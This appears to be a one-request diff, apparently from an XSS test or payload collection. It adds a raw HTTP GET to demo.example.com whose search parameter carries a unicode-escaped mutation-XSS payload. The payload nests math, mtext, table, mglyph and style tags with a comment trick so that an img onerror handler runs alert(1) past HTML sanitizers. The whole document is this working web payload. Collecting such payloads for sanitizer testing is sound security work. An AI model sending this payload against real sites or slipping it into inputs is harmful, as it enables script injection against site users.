@@ -1,0 +1,4 @@
+GET /a?search=\u003Cmath\u003E\u003Cmtext\u003E\u003Ctable\u003E\u003Cmglyph\u003E\u003Cstyle\u003E\u003C!--\u003C/style\u003E\u003Cimg%20src%3D--%20onerror%3Dalert(1)\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
